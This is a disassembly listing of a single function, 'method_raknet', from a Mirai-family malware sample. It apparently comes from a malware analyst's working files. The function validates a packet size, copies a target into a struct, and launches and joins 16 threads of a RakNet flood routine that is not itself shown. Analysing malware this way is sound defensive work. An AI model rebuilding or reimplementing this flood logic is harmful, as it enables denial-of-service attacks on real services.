
/Users/taogoldi/Projects/Malware/Mirai/input/d40cf9c95dcedf4f19e4a5f5bb744c8e98af87eb5703c850e6fda3b613668c28.elf:	file format elf64-x86-64

Disassembly of section .text:

00000000004010a0 <method_raknet>:
  4010a0: 41 56                        	push	r14
  4010a2: 41 89 d6                     	mov	r14d, edx
  4010a5: 41 55                        	push	r13
  4010a7: 41 54                        	push	r12
  4010a9: 41 89 f4                     	mov	r12d, esi
  4010ac: 55                           	push	rbp
  4010ad: 48 89 fd                     	mov	rbp, rdi
  4010b0: 53                           	push	rbx
  4010b1: 89 cb                        	mov	ebx, ecx
  4010b3: 8d 43 ff                     	lea	eax, [rbx - 0x1]
  4010b6: 48 81 ec d0 00 00 00         	sub	rsp, 0xd0
  4010bd: 3d e2 ff 00 00               	cmp	eax, 0xffe2
  4010c2: 76 21                        	jbe	0x4010e5 <method_raknet+0x45>
  4010c4: be e3 ff 00 00               	mov	esi, 0xffe3
  4010c9: bf c8 4c 41 00               	mov	edi, 0x414cc8
  4010ce: 31 c0                        	xor	eax, eax
  4010d0: e8 fb 6d 00 00               	call	0x407ed0 <printf>
  4010d5: 48 81 c4 d0 00 00 00         	add	rsp, 0xd0
  4010dc: 5b                           	pop	rbx
  4010dd: 5d                           	pop	rbp
  4010de: 41 5c                        	pop	r12
  4010e0: 41 5d                        	pop	r13
  4010e2: 41 5e                        	pop	r14
  4010e4: c3                           	ret
  4010e5: 4c 8d ac 24 80 00 00 00      	lea	r13, [rsp + 0x80]
  4010ed: ba 50 00 00 00               	mov	edx, 0x50
  4010f2: 31 f6                        	xor	esi, esi
  4010f4: 4c 89 ef                     	mov	rdi, r13
  4010f7: e8 24 8a 00 00               	call	0x409b20 <memset>
  4010fc: 48 89 ee                     	mov	rsi, rbp
  4010ff: ba 3f 00 00 00               	mov	edx, 0x3f
  401104: 4c 89 ef                     	mov	rdi, r13
  401107: 48 8d ac 24 80 00 00 00      	lea	rbp, [rsp + 0x80]
  40110f: e8 50 8c 00 00               	call	0x409d64 <strncpy>
  401114: 44 89 a4 24 c0 00 00 00      	mov	dword ptr [rsp + 0xc0], r12d
  40111c: 89 9c 24 c8 00 00 00         	mov	dword ptr [rsp + 0xc8], ebx
  401123: 49 89 e4                     	mov	r12, rsp
  401126: 44 89 b4 24 c4 00 00 00      	mov	dword ptr [rsp + 0xc4], r14d
  40112e: c6 84 24 cc 00 00 00 00      	mov	byte ptr [rsp + 0xcc], 0x0
  401136: 48 89 e3                     	mov	rbx, rsp
  401139: 66 66 66 90                  	nop
  40113d: 66 66 90                     	nop
  401140: 31 f6                        	xor	esi, esi
  401142: 48 89 df                     	mov	rdi, rbx
  401145: 4c 89 e9                     	mov	rcx, r13
  401148: ba e0 15 40 00               	mov	edx, 0x4015e0
  40114d: 48 83 c3 08                  	add	rbx, 0x8
  401151: e8 9a 49 00 00               	call	0x405af0 <pthread_create>
  401156: 48 39 eb                     	cmp	rbx, rbp
  401159: 75 e5                        	jne	0x401140 <method_raknet+0xa0>
  40115b: 31 db                        	xor	ebx, ebx
  40115d: 66 66 90                     	nop
  401160: 49 8b 3c dc                  	mov	rdi, qword ptr [r12 + 8*rbx]
  401164: 31 f6                        	xor	esi, esi
  401166: 48 ff c3                     	inc	rbx
  401169: e8 4d 19 00 00               	call	0x402abb <pthread_join>
  40116e: 48 83 fb 10                  	cmp	rbx, 0x10
  401172: 75 ec                        	jne	0x401160 <method_raknet+0xc0>
  401174: bf 51 50 41 00               	mov	edi, 0x415051
  401179: e8 ce 6c 00 00               	call	0x407e4c <puts>
  40117e: 48 81 c4 d0 00 00 00         	add	rsp, 0xd0
  401185: 5b                           	pop	rbx
  401186: 5d                           	pop	rbp
  401187: 41 5c                        	pop	r12
  401189: 41 5d                        	pop	r13
  40118b: 41 5e                        	pop	r14
  40118d: c3                           	ret
  40118e: 66 90                        	nop
